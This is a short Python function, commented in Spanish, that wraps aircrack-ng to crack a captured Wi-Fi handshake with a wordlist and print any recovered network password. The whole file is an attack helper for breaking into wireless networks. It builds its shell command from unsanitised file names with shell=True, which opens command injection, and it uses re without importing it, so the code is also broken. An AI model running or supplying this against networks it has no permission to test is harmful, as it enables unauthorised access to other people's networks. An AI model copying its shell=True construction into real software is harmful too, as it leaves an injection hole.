import subprocess
from colorama import Fore, Style

def crack_handshake(cap_file, wordlist):
    """Prueba contraseñas contra el handshake"""
    print(f"{Fore.CYAN}[*] Probando {wordlist} contra {cap_file}...{Style.RESET_ALL}")
    
    cmd = f"aircrack-ng -w {wordlist} {cap_file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if "KEY FOUND!" in result.stdout:
        # Extraer contraseña
        match = re.search(r"KEY FOUND! \[ (.*) \]", result.stdout)
        if match:
            print(f"{Fore.GREEN}[+] CONTRASEÑA ENCONTRADA: {match.group(1)}{Style.RESET_ALL}")
            return match.group(1)
    else:
        print(f"{Fore.RED}[-] Contraseña no encontrada en este diccionario{Style.RESET_ALL}")
    return None
